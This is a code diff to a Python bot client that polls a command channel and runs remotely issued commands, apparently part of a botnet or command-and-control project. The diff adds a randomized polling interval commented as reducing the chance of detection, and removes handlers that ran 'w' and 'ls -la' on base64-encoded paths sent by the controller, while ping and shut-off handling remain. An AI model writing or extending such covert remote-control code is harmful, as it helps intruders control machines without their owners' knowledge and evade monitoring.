@@ -4,6 +4,7 @@ import subprocess
 import threading
 from queue import Empty
 from queue import Queue
+import random
 
 import requests
 
@@ -36,7 +37,8 @@ class Bot:
                 print(f"New command = {command.body}")
                 self.unprocessed_commands.put(command)
 
-            sleep(2)
+            # Randomized sleep for a lesser chance of detection
+            sleep(random.uniform(1.5, 5))
 
         self.worker_thread.join()
 
@@ -58,28 +60,6 @@ class Bot:
             # PING
             if Channel.PING_REQUEST in current_command.body:
                 self.channel.send_message(f"{Channel.PING_RESPONSE} {response_id}")
-
-            # W
-            elif (
-                Channel.W_REQUEST in current_command.body
-                and ip_b64 in current_command.body
-            ):
-                self.execute_binary(["w"], Channel.W_RESPONSE, response_id)
-
-            # LS
-            elif (
-                Channel.LS_REQUEST in current_command.body
-                and ip_b64 in current_command.body
-            ):
-                path = (
-                    base64.b64decode(
-                        current_command.body.split("<")[1].split(">")[0]
-                    ).decode("utf-8")
-                    if "<" in current_command.body and ">" in current_command.body
-                    else None
-                )
-                args = ["ls", "-la", path] if path else ["ls", "-la"]
-                self.execute_binary(args, Channel.LS_REQUEST, response_id)
 
             # SHUT OFF
             elif (
